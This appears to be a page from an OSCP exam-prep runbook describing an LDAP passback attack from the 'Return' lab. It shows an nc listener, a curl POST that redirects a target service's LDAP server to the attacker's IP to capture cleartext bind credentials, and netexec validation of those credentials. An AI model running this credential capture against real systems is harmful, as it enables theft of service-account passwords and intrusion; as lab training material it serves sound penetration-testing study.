# AD - LDAP Passback

**Step 37A of 50 · AD**

*Capture cleartext credentials from a service that attempts an outbound LDAP authentication to an attacker-controlled listener.*

## Run this

Start a raw TCP listener on the LDAP port:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
nc -lvnp $Port
```

Trigger the outbound connection by pointing the service's LDAP server address at Kali:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

Read the credential from the listener output. It arrives as a cleartext LDAP Simple Bind.

## Example output

```text
Connection received on $BoxIP <source-port>
LDAP Simple Bind for $Domain\$Username
<password-redacted>
```

## What did you get?

- [ ] A cleartext credential was captured → **Run `boxset Username $Username` and `boxset Password $Password`, validate with `netexec smb $BoxIP -u $Username -p $Password`, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] No connection was received → **Run `curl -s http://$BoxIP/ | grep -i -A2 -B2 'server'`, confirm the server-address field is posted, run `ss -ltnp | grep 389`, then submit the form once**

## Notes

Use `nc`, not Responder. Responder handles SMB and HTTP NTLM challenges. LDAP Simple Bind sends credentials as raw TCP data, so a plain listener is sufficient.

The browser may mask the password, but the service sends its stored value when it makes the outbound LDAP connection.

## Gotcha

> [!warning] 💡
> Only named HTML form fields are included in a POST submission. Inspect the source before submitting. If the server address field is not named, the attack can silently fail.

> [!warning] 💡
> Use single quotes in zsh when storing passwords containing `!`. Double quotes or bare strings can trigger history expansion and corrupt the value.

## External Resources

- [HackTricks, LDAP Attacks](https://book.hacktricks.wiki/en/pentesting/pentesting-ldap.html)
- [PayloadsAllTheThings, LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Return|Return]] -- confirmed in the box write-up

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
